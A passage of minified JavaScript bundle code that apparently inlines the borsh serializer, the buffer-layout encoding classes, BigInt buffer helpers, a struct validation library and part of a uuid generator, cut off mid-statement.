if(r.kind==="enum"){const i=e[r.field];for(let s=0;s<r.values.length;++s){const[o,a]=r.values[s];if(o===i){t.writeU8(s),zo(n,o,e[o],a,t);break}}}else throw new sr(`Unexpected schema kind: ${r.kind} for ${e.constructor.name}`)}function ML(n,e,t=Ib){const r=new t;return Tb(n,e,r),r.toArray()}var Ab=Dn.serialize=ML;function Wo(n,e,t,r){try{if(typeof t=="string")return r[`read${Sb(t)}`]();if(t instanceof Array){if(typeof t[0]=="number")return r.readFixedArray(t[0]);if(typeof t[1]=="number"){const i=[];for(let s=0;s<t[1];s++)i.push(Wo(n,null,t[0],r));return i}else return r.readArray(()=>Wo(n,e,t[0],r))}if(t.kind==="option")return r.readU8()?Wo(n,e,t.type,r):void 0;if(t.kind==="map"){let i=new Map;const s=r.readU32();for(let o=0;o<s;o++){const a=Wo(n,e,t.key,r),l=Wo(n,e,t.value,r);i.set(a,l)}return i}return Gw(n,t,r)}catch(i){throw i instanceof sr&&i.addToFieldPath(e),i}}function Gw(n,e,t){if(typeof e.borshDeserialize=="function")return e.borshDeserialize(t);const r=n.get(e);if(!r)throw new sr(`Class ${e.name} is missing in schema`);if(r.kind==="struct"){const i={};for(const[s,o]of n.get(e).fields)i[s]=Wo(n,s,o,t);return new e(i)}if(r.kind==="enum"){const i=t.readU8();if(i>=r.values.length)throw new sr(`Enum index: ${i} is out of range`);const[s,o]=r.values[i],a=Wo(n,s,o,t);return new e({[s]:a})}throw new sr(`Unexpected schema kind: ${r.kind} for ${e.constructor.name}`)}function NL(n,e,t,r=Dr){const i=new r(t),s=Gw(n,e,i);if(i.offset<t.length)throw new sr(`Unexpected ${t.length-i.offset} bytes after deserialized data`);return s}var bb=Dn.deserialize=NL;function PL(n,e,t,r=Dr){const i=new r(t);return Gw(n,e,i)}_b=Dn.deserializeUnchecked=PL;var ee={};Object.defineProperty(ee,"__esModule",{value:!0});ee.s16=ee.s8=ee.nu64be=ee.u48be=ee.u40be=ee.u32be=ee.u24be=ee.u16be=Mn=ee.nu64=ee.u48=ee.u40=be=ee.u32=ee.u24=Fr=ee.u16=it=ee.u8=ra=ee.offset=ee.greedy=ee.Constant=ee.UTF8=ee.CString=ee.Blob=ee.Boolean=ee.BitField=ee.BitStructure=ee.VariantLayout=ee.Union=ee.UnionLayoutDiscriminator=ee.UnionDiscriminator=ee.Structure=ee.Sequence=ee.DoubleBE=ee.Double=ee.FloatBE=ee.Float=ee.NearInt64BE=ee.NearInt64=ee.NearUInt64BE=ee.NearUInt64=ee.IntBE=ee.Int=ee.UIntBE=ee.UInt=ee.OffsetLayout=ee.GreedyCount=ee.ExternalLayout=ee.bindConstructorLayout=ee.nameWithProperty=ee.Layout=ee.uint8ArrayToBuffer=ee.checkUint8Array=void 0;ee.constant=ee.utf8=ee.cstr=Rt=ee.blob=ee.unionLayoutDiscriminator=ee.union=tr=ee.seq=ee.bits=_e=ee.struct=ee.f64be=ee.f64=ee.f32be=ee.f32=ee.ns64be=ee.s48be=ee.s40be=ee.s32be=ee.s24be=ee.s16be=Ar=ee.ns64=ee.s48=ee.s40=ee.s32=ee.s24=void 0;const Qw=ve;function sc(n){if(!(n instanceof Uint8Array))throw new TypeError("b must be a Uint8Array")}ee.checkUint8Array=sc;function rt(n){return sc(n),Qw.Buffer.from(n.buffer,n.byteOffset,n.length)}ee.uint8ArrayToBuffer=rt;class dt{constructor(e,t){if(!Number.isInteger(e))throw new TypeError("span must be an integer");this.span=e,this.property=t}makeDestinationObject(){return{}}getSpan(e,t){if(0>this.span)throw new RangeError("indeterminate span");return this.span}replicate(e){const t=Object.create(this.constructor.prototype);return Object.assign(t,this),t.property=e,t}fromArray(e){}}ee.Layout=dt;function Yw(n,e){return e.property?n+"["+e.property+"]":n}ee.nameWithProperty=Yw;function LL(n,e){if(typeof n!="function")throw new TypeError("Class must be constructor");if(Object.prototype.hasOwnProperty.call(n,"layout_"))throw new Error("Class is already bound to a layout");if(!(e&&e instanceof dt))throw new TypeError("layout must be a Layout");if(Object.prototype.hasOwnProperty.call(e,"boundConstructor_"))throw new Error("layout is already bound to a constructor");n.layout_=e,e.boundConstructor_=n,e.makeDestinationObject=()=>new n,Object.defineProperty(n.prototype,"encode",{value(t,r){return e.encode(this,t,r)},writable:!0}),Object.defineProperty(n,"decode",{value(t,r){return e.decode(t,r)},writable:!0})}ee.bindConstructorLayout=LL;class gr extends dt{isCount(){throw new Error("ExternalLayout is abstract")}}ee.ExternalLayout=gr;class xb extends gr{constructor(e=1,t){if(!Number.isInteger(e)||0>=e)throw new TypeError("elementSpan must be a (positive) integer");super(-1,t),this.elementSpan=e}isCount(){return!0}decode(e,t=0){sc(e);const r=e.length-t;return Math.floor(r/this.elementSpan)}encode(e,t,r){return 0}}ee.GreedyCount=xb;class Zw extends gr{constructor(e,t=0,r){if(!(e instanceof dt))throw new TypeError("layout must be a Layout");if(!Number.isInteger(t))throw new TypeError("offset must be integer or undefined");super(e.span,r||e.property),this.layout=e,this.offset=t}isCount(){return this.layout instanceof Gr||this.layout instanceof hi}decode(e,t=0){return this.layout.decode(e,t+this.offset)}encode(e,t,r=0){return this.layout.encode(e,t,r+this.offset)}}ee.OffsetLayout=Zw;class Gr extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readUIntLE(t,this.span)}encode(e,t,r=0){return rt(t).writeUIntLE(e,r,this.span),this.span}}ee.UInt=Gr;class hi extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readUIntBE(t,this.span)}encode(e,t,r=0){return rt(t).writeUIntBE(e,r,this.span),this.span}}ee.UIntBE=hi;class Ia extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readIntLE(t,this.span)}encode(e,t,r=0){return rt(t).writeIntLE(e,r,this.span),this.span}}ee.Int=Ia;class oc extends dt{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return rt(e).readIntBE(t,this.span)}encode(e,t,r=0){return rt(t).writeIntBE(e,r,this.span),this.span}}ee.IntBE=oc;const V0=Math.pow(2,32);function kp(n){const e=Math.floor(n/V0),t=n-e*V0;return{hi32:e,lo32:t}}function Cp(n,e){return n*V0+e}class kb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32LE(t),s=r.readUInt32LE(t+4);return Cp(s,i)}encode(e,t,r=0){const i=kp(e),s=rt(t);return s.writeUInt32LE(i.lo32,r),s.writeUInt32LE(i.hi32,r+4),8}}ee.NearUInt64=kb;class Cb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32BE(t),s=r.readUInt32BE(t+4);return Cp(i,s)}encode(e,t,r=0){const i=kp(e),s=rt(t);return s.writeUInt32BE(i.hi32,r),s.writeUInt32BE(i.lo32,r+4),8}}ee.NearUInt64BE=Cb;class Rb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readUInt32LE(t),s=r.readInt32LE(t+4);return Cp(s,i)}encode(e,t,r=0){const i=kp(e),s=rt(t);return s.writeUInt32LE(i.lo32,r),s.writeInt32LE(i.hi32,r+4),8}}ee.NearInt64=Rb;class Mb extends dt{constructor(e){super(8,e)}decode(e,t=0){const r=rt(e),i=r.readInt32BE(t),s=r.readUInt32BE(t+4);return Cp(i,s)}encode(e,t,r=0){const i=kp(e),s=rt(t);return s.writeInt32BE(i.hi32,r),s.writeUInt32BE(i.lo32,r+4),8}}ee.NearInt64BE=Mb;class Nb extends dt{constructor(e){super(4,e)}decode(e,t=0){return rt(e).readFloatLE(t)}encode(e,t,r=0){return rt(t).writeFloatLE(e,r),4}}ee.Float=Nb;class Pb extends dt{constructor(e){super(4,e)}decode(e,t=0){return rt(e).readFloatBE(t)}encode(e,t,r=0){return rt(t).writeFloatBE(e,r),4}}ee.FloatBE=Pb;class Lb extends dt{constructor(e){super(8,e)}decode(e,t=0){return rt(e).readDoubleLE(t)}encode(e,t,r=0){return rt(t).writeDoubleLE(e,r),8}}ee.Double=Lb;class Db extends dt{constructor(e){super(8,e)}decode(e,t=0){return rt(e).readDoubleBE(t)}encode(e,t,r=0){return rt(t).writeDoubleBE(e,r),8}}ee.DoubleBE=Db;class Ob extends dt{constructor(e,t,r){if(!(e instanceof dt))throw new TypeError("elementLayout must be a Layout");if(!(t instanceof gr&&t.isCount()||Number.isInteger(t)&&0<=t))throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let i=-1;!(t instanceof gr)&&0<e.span&&(i=t*e.span),super(i,r),this.elementLayout=e,this.count=t}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0,i=this.count;if(i instanceof gr&&(i=i.decode(e,t)),0<this.elementLayout.span)r=i*this.elementLayout.span;else{let s=0;for(;s<i;)r+=this.elementLayout.getSpan(e,t+r),++s}return r}decode(e,t=0){const r=[];let i=0,s=this.count;for(s instanceof gr&&(s=s.decode(e,t));i<s;)r.push(this.elementLayout.decode(e,t)),t+=this.elementLayout.getSpan(e,t),i+=1;return r}encode(e,t,r=0){const i=this.elementLayout,s=e.reduce((o,a)=>o+i.encode(a,t,r+o),0);return this.count instanceof gr&&this.count.encode(e.length,t,r),s}}ee.Sequence=Ob;class Bb extends dt{constructor(e,t,r){if(!(Array.isArray(e)&&e.reduce((s,o)=>s&&o instanceof dt,!0)))throw new TypeError("fields must be array of Layout instances");typeof t=="boolean"&&r===void 0&&(r=t,t=void 0);for(const s of e)if(0>s.span&&s.property===void 0)throw new Error("fields cannot contain unnamed variable-length layout");let i=-1;try{i=e.reduce((s,o)=>s+o.getSpan(),0)}catch{}super(i,t),this.fields=e,this.decodePrefixes=!!r}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0;try{r=this.fields.reduce((i,s)=>{const o=s.getSpan(e,t);return t+=o,i+o},0)}catch{throw new RangeError("indeterminate span")}return r}decode(e,t=0){sc(e);const r=this.makeDestinationObject();for(const i of this.fields)if(i.property!==void 0&&(r[i.property]=i.decode(e,t)),t+=i.getSpan(e,t),this.decodePrefixes&&e.length===t)break;return r}encode(e,t,r=0){const i=r;let s=0,o=0;for(const a of this.fields){let l=a.span;if(o=0<l?l:0,a.property!==void 0){const u=e[a.property];u!==void 0&&(o=a.encode(u,t,r),0>l&&(l=a.getSpan(t,r)))}s=r,r+=l}return s+o-i}fromArray(e){const t=this.makeDestinationObject();for(const r of this.fields)r.property!==void 0&&0<e.length&&(t[r.property]=e.shift());return t}layoutFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(const t of this.fields)if(t.property===e)return t}offsetOf(e){if(typeof e!="string")throw new TypeError("property must be string");let t=0;for(const r of this.fields){if(r.property===e)return t;0>r.span?t=-1:0<=t&&(t+=r.span)}}}ee.Structure=Bb;class Jw{constructor(e){this.property=e}decode(e,t){throw new Error("UnionDiscriminator is abstract")}encode(e,t,r){throw new Error("UnionDiscriminator is abstract")}}ee.UnionDiscriminator=Jw;class bd extends Jw{constructor(e,t){if(!(e instanceof gr&&e.isCount()))throw new TypeError("layout must be an unsigned integer ExternalLayout");super(t||e.property||"variant"),this.layout=e}decode(e,t){return this.layout.decode(e,t)}encode(e,t,r){return this.layout.encode(e,t,r)}}ee.UnionLayoutDiscriminator=bd;class Xw extends dt{constructor(e,t,r){let i;if(e instanceof Gr||e instanceof hi)i=new bd(new Zw(e));else if(e instanceof gr&&e.isCount())i=new bd(e);else if(e instanceof Jw)i=e;else throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");if(t===void 0&&(t=null),!(t===null||t instanceof dt))throw new TypeError("defaultLayout must be null or a Layout");if(t!==null){if(0>t.span)throw new Error("defaultLayout must have constant span");t.property===void 0&&(t=t.replicate("content"))}let s=-1;t&&(s=t.span,0<=s&&(e instanceof Gr||e instanceof hi)&&(s+=i.layout.span)),super(s,r),this.discriminator=i,this.usesPrefixDiscriminator=e instanceof Gr||e instanceof hi,this.defaultLayout=t,this.registry={};let o=this.defaultGetSourceVariant.bind(this);this.getSourceVariant=function(a){return o(a)},this.configGetSourceVariant=function(a){o=a.bind(this)}}getSpan(e,t=0){if(0<=this.span)return this.span;const r=this.getVariant(e,t);if(!r)throw new Error("unable to determine span for unrecognized variant");return r.getSpan(e,t)}defaultGetSourceVariant(e){if(Object.prototype.hasOwnProperty.call(e,this.discriminator.property)){if(this.defaultLayout&&this.defaultLayout.property&&Object.prototype.hasOwnProperty.call(e,this.defaultLayout.property))return;const t=this.registry[e[this.discriminator.property]];if(t&&(!t.layout||t.property&&Object.prototype.hasOwnProperty.call(e,t.property)))return t}else for(const t in this.registry){const r=this.registry[t];if(r.property&&Object.prototype.hasOwnProperty.call(e,r.property))return r}throw new Error("unable to infer src variant")}decode(e,t=0){let r;const i=this.discriminator,s=i.decode(e,t),o=this.registry[s];if(o===void 0){const a=this.defaultLayout;let l=0;this.usesPrefixDiscriminator&&(l=i.layout.span),r=this.makeDestinationObject(),r[i.property]=s,r[a.property]=a.decode(e,t+l)}else r=o.decode(e,t);return r}encode(e,t,r=0){const i=this.getSourceVariant(e);if(i===void 0){const s=this.discriminator,o=this.defaultLayout;let a=0;return this.usesPrefixDiscriminator&&(a=s.layout.span),s.encode(e[s.property],t,r),a+o.encode(e[o.property],t,r+a)}return i.encode(e,t,r)}addVariant(e,t,r){const i=new Ub(this,e,t,r);return this.registry[e]=i,i}getVariant(e,t=0){let r;return e instanceof Uint8Array?r=this.discriminator.decode(e,t):r=e,this.registry[r]}}ee.Union=Xw;class Ub extends dt{constructor(e,t,r,i){if(!(e instanceof Xw))throw new TypeError("union must be a Union");if(!Number.isInteger(t)||0>t)throw new TypeError("variant must be a (non-negative) integer");if(typeof r=="string"&&i===void 0&&(i=r,r=null),r){if(!(r instanceof dt))throw new TypeError("layout must be a Layout");if(e.defaultLayout!==null&&0<=r.span&&r.span>e.defaultLayout.span)throw new Error("variant span exceeds span of containing union");if(typeof i!="string")throw new TypeError("variant must have a String property")}let s=e.span;0>e.span&&(s=r?r.span:0,0<=s&&e.usesPrefixDiscriminator&&(s+=e.discriminator.layout.span)),super(s,i),this.union=e,this.variant=t,this.layout=r||null}getSpan(e,t=0){if(0<=this.span)return this.span;let r=0;this.union.usesPrefixDiscriminator&&(r=this.union.discriminator.layout.span);let i=0;return this.layout&&(i=this.layout.getSpan(e,t+r)),r+i}decode(e,t=0){const r=this.makeDestinationObject();if(this!==this.union.getVariant(e,t))throw new Error("variant mismatch");let i=0;return this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout?r[this.property]=this.layout.decode(e,t+i):this.property?r[this.property]=!0:this.union.usesPrefixDiscriminator&&(r[this.union.discriminator.property]=this.variant),r}encode(e,t,r=0){let i=0;if(this.union.usesPrefixDiscriminator&&(i=this.union.discriminator.layout.span),this.layout&&!Object.prototype.hasOwnProperty.call(e,this.property))throw new TypeError("variant lacks property "+this.property);this.union.discriminator.encode(this.variant,t,r);let s=i;if(this.layout&&(this.layout.encode(e[this.property],t,r+i),s+=this.layout.getSpan(t,r+i),0<=this.union.span&&s>this.union.span))throw new Error("encoded variant overruns containing union");return s}fromArray(e){if(this.layout)return this.layout.fromArray(e)}}ee.VariantLayout=Ub;function $a(n){return 0>n&&(n+=4294967296),n}class ev extends dt{constructor(e,t,r){if(!(e instanceof Gr||e instanceof hi))throw new TypeError("word must be a UInt or UIntBE layout");if(typeof t=="string"&&r===void 0&&(r=t,t=!1),4<e.span)throw new RangeError("word cannot exceed 32 bits");super(e.span,r),this.word=e,this.msb=!!t,this.fields=[];let i=0;this._packedSetValue=function(s){return i=$a(s),this},this._packedGetValue=function(){return i}}decode(e,t=0){const r=this.makeDestinationObject(),i=this.word.decode(e,t);this._packedSetValue(i);for(const s of this.fields)s.property!==void 0&&(r[s.property]=s.decode(e));return r}encode(e,t,r=0){const i=this.word.decode(t,r);this._packedSetValue(i);for(const s of this.fields)if(s.property!==void 0){const o=e[s.property];o!==void 0&&s.encode(o)}return this.word.encode(this._packedGetValue(),t,r)}addField(e,t){const r=new tv(this,e,t);return this.fields.push(r),r}addBoolean(e){const t=new jb(this,e);return this.fields.push(t),t}fieldFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(const t of this.fields)if(t.property===e)return t}}ee.BitStructure=ev;class tv{constructor(e,t,r){if(!(e instanceof ev))throw new TypeError("container must be a BitStructure");if(!Number.isInteger(t)||0>=t)throw new TypeError("bits must be positive integer");const i=8*e.span,s=e.fields.reduce((o,a)=>o+a.bits,0);if(t+s>i)throw new Error("bits too long for span remainder ("+(i-s)+" of "+i+" remain)");this.container=e,this.bits=t,this.valueMask=(1<<t)-1,t===32&&(this.valueMask=4294967295),this.start=s,this.container.msb&&(this.start=i-s-t),this.wordMask=$a(this.valueMask<<this.start),this.property=r}decode(e,t){const r=this.container._packedGetValue();return $a(r&this.wordMask)>>>this.start}encode(e){if(typeof e!="number"||!Number.isInteger(e)||e!==$a(e&this.valueMask))throw new TypeError(Yw("BitField.encode",this)+" value must be integer not exceeding "+this.valueMask);const t=this.container._packedGetValue(),r=$a(e<<this.start);this.container._packedSetValue($a(t&~this.wordMask)|r)}}ee.BitField=tv;let jb=class extends tv{constructor(e,t){super(e,1,t)}decode(e,t){return!!super.decode(e,t)}encode(e){typeof e=="boolean"&&(e=+e),super.encode(e)}};ee.Boolean=jb;let Vb=class extends dt{constructor(e,t){if(!(e instanceof gr&&e.isCount()||Number.isInteger(e)&&0<=e))throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");let r=-1;e instanceof gr||(r=e),super(r,t),this.length=e}getSpan(e,t){let r=this.span;return 0>r&&(r=this.length.decode(e,t)),r}decode(e,t=0){let r=this.span;return 0>r&&(r=this.length.decode(e,t)),rt(e).slice(t,t+r)}encode(e,t,r){let i=this.length;if(this.length instanceof gr&&(i=e.length),!(e instanceof Uint8Array&&i===e.length))throw new TypeError(Yw("Blob.encode",this)+" requires (length "+i+") Uint8Array as src");if(r+i>t.length)throw new RangeError("encoding overruns Uint8Array");const s=rt(e);return rt(t).write(s.toString("hex"),r,i,"hex"),this.length instanceof gr&&this.length.encode(i,t,r),i}};ee.Blob=Vb;class Fb extends dt{constructor(e){super(-1,e)}getSpan(e,t=0){sc(e);let r=t;for(;r<e.length&&e[r]!==0;)r+=1;return 1+r-t}decode(e,t=0){const r=this.getSpan(e,t);return rt(e).slice(t,t+r-1).toString("utf-8")}encode(e,t,r=0){typeof e!="string"&&(e=String(e));const i=Qw.Buffer.from(e,"utf8"),s=i.length;if(r+s>t.length)throw new RangeError("encoding overruns Buffer");const o=rt(t);return i.copy(o,r),o[r+s]=0,s+1}}ee.CString=Fb;class zb extends dt{constructor(e,t){if(typeof e=="string"&&t===void 0&&(t=e,e=void 0),e===void 0)e=-1;else if(!Number.isInteger(e))throw new TypeError("maxSpan must be an integer");super(-1,t),this.maxSpan=e}getSpan(e,t=0){return sc(e),e.length-t}decode(e,t=0){const r=this.getSpan(e,t);if(0<=this.maxSpan&&this.maxSpan<r)throw new RangeError("text length exceeds maxSpan");return rt(e).slice(t,t+r).toString("utf-8")}encode(e,t,r=0){typeof e!="string"&&(e=String(e));const i=Qw.Buffer.from(e,"utf8"),s=i.length;if(0<=this.maxSpan&&this.maxSpan<s)throw new RangeError("text length exceeds maxSpan");if(r+s>t.length)throw new RangeError("encoding overruns Buffer");return i.copy(rt(t),r),s}}ee.UTF8=zb;class Wb extends dt{constructor(e,t){super(0,t),this.value=e}decode(e,t){return this.value}encode(e,t,r){return 0}}ee.Constant=Wb;ee.greedy=(n,e)=>new xb(n,e);var ra=ee.offset=(n,e,t)=>new Zw(n,e,t),it=ee.u8=n=>new Gr(1,n),Fr=ee.u16=n=>new Gr(2,n);ee.u24=n=>new Gr(3,n);var be=ee.u32=n=>new Gr(4,n);ee.u40=n=>new Gr(5,n);ee.u48=n=>new Gr(6,n);var Mn=ee.nu64=n=>new kb(n);ee.u16be=n=>new hi(2,n);ee.u24be=n=>new hi(3,n);ee.u32be=n=>new hi(4,n);ee.u40be=n=>new hi(5,n);ee.u48be=n=>new hi(6,n);ee.nu64be=n=>new Cb(n);ee.s8=n=>new Ia(1,n);ee.s16=n=>new Ia(2,n);ee.s24=n=>new Ia(3,n);ee.s32=n=>new Ia(4,n);ee.s40=n=>new Ia(5,n);ee.s48=n=>new Ia(6,n);var Ar=ee.ns64=n=>new Rb(n);ee.s16be=n=>new oc(2,n);ee.s24be=n=>new oc(3,n);ee.s32be=n=>new oc(4,n);ee.s40be=n=>new oc(5,n);ee.s48be=n=>new oc(6,n);ee.ns64be=n=>new Mb(n);ee.f32=n=>new Nb(n);ee.f32be=n=>new Pb(n);ee.f64=n=>new Lb(n);ee.f64be=n=>new Db(n);var _e=ee.struct=(n,e,t)=>new Bb(n,e,t);ee.bits=(n,e,t)=>new ev(n,e,t);var tr=ee.seq=(n,e,t)=>new Ob(n,e,t);ee.union=(n,e,t)=>new Xw(n,e,t);ee.unionLayoutDiscriminator=(n,e)=>new bd(n,e);var Rt=ee.blob=(n,e)=>new Vb(n,e);ee.cstr=n=>new Fb(n);ee.utf8=(n,e)=>new zb(n,e);ee.constant=(n,e)=>new Wb(n,e);var hh={};Object.defineProperty(hh,"__esModule",{value:!0});function DL(n){{const e=ve.Buffer.from(n);e.reverse();const t=e.toString("hex");return t.length===0?BigInt(0):BigInt(`0x${t}`)}}var OL=hh.toBigIntLE=DL;function BL(n){{const e=n.toString("hex");return e.length===0?BigInt(0):BigInt(`0x${e}`)}}hh.toBigIntBE=BL;function UL(n,e){{const t=n.toString(16),r=ve.Buffer.from(t.padStart(e*2,"0").slice(0,e*2),"hex");return r.reverse(),r}}var jL=hh.toBufferLE=UL;function VL(n,e){{const t=n.toString(16);return ve.Buffer.from(t.padStart(e*2,"0").slice(0,e*2),"hex")}}hh.toBufferBE=VL;class FL extends TypeError{constructor(e,t){let r;const{message:i,explanation:s,...o}=e,{path:a}=e,l=a.length===0?i:`At path: ${a.join(".")} -- ${i}`;super(s??l),s!=null&&(this.cause=l),Object.assign(this,o),this.name=this.constructor.name,this.failures=()=>r??(r=[e,...t()])}}function zL(n){return fh(n)&&typeof n[Symbol.iterator]=="function"}function fh(n){return typeof n=="object"&&n!=null}function xd(n){return fh(n)&&!Array.isArray(n)}function gi(n){return typeof n=="symbol"?n.toString():typeof n=="string"?JSON.stringify(n):`${n}`}function WL(n){const{done:e,value:t}=n.next();return e?void 0:t}function $L(n,e,t,r){if(n===!0)return;n===!1?n={}:typeof n=="string"&&(n={message:n});const{path:i,branch:s}=e,{type:o}=t,{refinement:a,message:l=`Expected a value of type \`${o}\`${a?` with refinement \`${a}\``:""}, but received: \`${gi(r)}\``}=n;return{value:r,type:o,refinement:a,key:i[i.length-1],path:i,branch:s,...n,message:l}}function*wE(n,e,t,r){zL(n)||(n=[n]);for(const i of n){const s=$L(i,e,t,r);s&&(yield s)}}function*nv(n,e,t={}){const{path:r=[],branch:i=[n],coerce:s=!1,mask:o=!1}=t,a={path:r,branch:i,mask:o};s&&(n=e.coercer(n,a));let l="valid";for(const u of e.validator(n,a))u.explanation=t.message,l="not_valid",yield[u,void 0];for(let[u,h,f]of e.entries(n,a)){const p=nv(h,f,{path:u===void 0?r:[...r,u],branch:u===void 0?i:[...i,h],coerce:s,mask:o,message:t.message});for(const w of p)w[0]?(l=w[0].refinement!=null?"not_refined":"not_valid",yield[w[0],void 0]):s&&(h=w[1],u===void 0?n=h:n instanceof Map?n.set(u,h):n instanceof Set?n.add(h):fh(n)&&(h!==void 0||u in n)&&(n[u]=h))}if(l!=="not_valid")for(const u of e.refiner(n,a))u.explanation=t.message,l="not_refined",yield[u,void 0];l==="valid"&&(yield[void 0,n])}let Bi=class{constructor(e){const{type:t,schema:r,validator:i,refiner:s,coercer:o=l=>l,entries:a=function*(){}}=e;this.type=t,this.schema=r,this.entries=a,this.coercer=o,i?this.validator=(l,u)=>{const h=i(l,u);return wE(h,u,this,l)}:this.validator=()=>[],s?this.refiner=(l,u)=>{const h=s(l,u);return wE(h,u,this,l)}:this.refiner=()=>[]}assert(e,t){return HL(e,this,t)}create(e,t){return de(e,this,t)}is(e){return $b(e,this)}mask(e,t){return qL(e,this,t)}validate(e,t={}){return dh(e,this,t)}};function HL(n,e,t){const r=dh(n,e,{message:t});if(r[0])throw r[0]}function de(n,e,t){const r=dh(n,e,{coerce:!0,message:t});if(r[0])throw r[0];return r[1]}function qL(n,e,t){const r=dh(n,e,{coerce:!0,mask:!0,message:t});if(r[0])throw r[0];return r[1]}function $b(n,e){return!dh(n,e)[0]}function dh(n,e,t={}){const r=nv(n,e,t),i=WL(r);return i[0]?[new FL(i[0],function*(){for(const o of r)o[0]&&(yield o[0])}),void 0]:[void 0,i[1]]}function Sa(n,e){return new Bi({type:n,schema:null,validator:e})}function KL(){return Sa("any",()=>!0)}function pe(n){return new Bi({type:"array",schema:n,*entries(e){if(n&&Array.isArray(e))for(const[t,r]of e.entries())yield[t,r,n]},coercer(e){return Array.isArray(e)?e.slice():e},validator(e){return Array.isArray(e)||`Expected an array value, but received: ${gi(e)}`}})}function Ni(){return Sa("boolean",n=>typeof n=="boolean")}function rv(n){return Sa("instance",e=>e instanceof n||`Expected a \`${n.name}\` instance, but received: ${gi(e)}`)}function $t(n){const e=gi(n),t=typeof n;return new Bi({type:"literal",schema:t==="string"||t==="number"||t==="boolean"?n:null,validator(r){return r===n||`Expected the literal \`${e}\`, but received: ${gi(r)}`}})}function GL(){return Sa("never",()=>!1)}function ge(n){return new Bi({...n,validator:(e,t)=>e===null||n.validator(e,t),refiner:(e,t)=>e===null||n.refiner(e,t)})}function X(){return Sa("number",n=>typeof n=="number"&&!isNaN(n)||`Expected a number, but received: ${gi(n)}`)}function xe(n){return new Bi({...n,validator:(e,t)=>e===void 0||n.validator(e,t),refiner:(e,t)=>e===void 0||n.refiner(e,t)})}function Hb(n,e){return new Bi({type:"record",schema:null,*entries(t){if(fh(t))for(const r in t){const i=t[r];yield[r,r,n],yield[r,i,e]}},validator(t){return xd(t)||`Expected an object, but received: ${gi(t)}`},coercer(t){return xd(t)?{...t}:t}})}function ue(){return Sa("string",n=>typeof n=="string"||`Expected a string, but received: ${gi(n)}`)}function iv(n){const e=GL();return new Bi({type:"tuple",schema:null,*entries(t){if(Array.isArray(t)){const r=Math.max(n.length,t.length);for(let i=0;i<r;i++)yield[i,t[i],n[i]||e]}},validator(t){return Array.isArray(t)||`Expected an array, but received: ${gi(t)}`},coercer(t){return Array.isArray(t)?t.slice():t}})}function se(n){const e=Object.keys(n);return new Bi({type:"type",schema:n,*entries(t){if(fh(t))for(const r of e)yield[r,t[r],n[r]]},validator(t){return xd(t)||`Expected an object, but received: ${gi(t)}`},coercer(t){return xd(t)?{...t}:t}})}function lr(n){const e=n.map(t=>t.type).join(" | ");return new Bi({type:"union",schema:null,coercer(t,r){for(const i of n){const[s,o]=i.validate(t,{coerce:!0,mask:r.mask});if(!s)return o}return t},validator(t,r){const i=[];for(const s of n){const[...o]=nv(t,s,r),[a]=o;if(a[0])for(const[l]of o)l&&i.push(l);else return[]}return[`Expected the value to satisfy a union of \`${e}\`, but received: ${gi(t)}`,...i]}})}function ac(){return Sa("unknown",()=>!0)}function ph(n,e,t){return new Bi({...n,coercer:(r,i)=>$b(r,e)?n.coercer(t(r,i),i):n.coercer(r,i)})}var cf,QL=new Uint8Array(16);function qb(){if(!cf&&(cf=typeof crypto<"u"&&crypto.getRandomValues&&crypto.getRandomValues.bind(crypto)||typeof msCrypto<"u"&&typeof msCrypto.getRandomValues=="function"&&msCrypto.getRandomValues.bind(msCrypto),!cf))throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");return cf(QL)}const YL=/^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;function Rp(n){return typeof n=="string"&&YL.test(n)}var Rn=[];for(var nm=0;nm<256;++nm)Rn.push((nm+256).toString(16).substr(1));function Mp(n){var e=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,t=(Rn[n[e+0]]+Rn[n[e+1]]+Rn[n[e+2]]+Rn[n[e+3]]+"-"+Rn[n[e+4]]+Rn[n[e+5]]+"-"+Rn[n[e+6]]+Rn[n[e+7]]+"-"+Rn[n[e+8]]+Rn[n[e+9]]+"-"+Rn[n[e+10]]+Rn[n[e+11]]+Rn[n[e+12]]+Rn[n[e+13]]+Rn[n[e+14]]+Rn[n[e+15]]).toLowerCase();if(!Rp(t))throw TypeError("Stringified UUID is invalid");return t}var vE,rm,im=0,sm=0;function ZL(n,e,t){var r=e&&t||0,i=e||new Array(16);n=n||{};var s=n.node||vE,o=n.clockseq!==void 0?n.clockseq:rm;if(s==null||o==null){var a=n.random||(n.rng||qb)();s==null&&(s=vE=[a[0]|1,a[1],a[2],a[3],a[4],a[5]]),o==null&&(o=rm=(a[6]<<8|a[7])&16383)}var l=n.msecs!==void 0?n.msecs:Date.now(),u=n.nsecs!==void 0?n.nsecs:sm+1,h=l-im+(u-sm)/1e4;if(h<0&&n.clockseq===void 0&&(o=o+1&16383),(h<0||l>im)&&n.nsecs===void 0&&(u=0),u>=1e4)throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");im=l,sm=u,rm=o,l+=122192928e5;var f=((l&268435455)*1e4+u)%4294967296;i[r++]=f>>>24&255,i[r++]=f>>>16&255,i[r++]=f>>>8&255,i[r++]=f&255;var 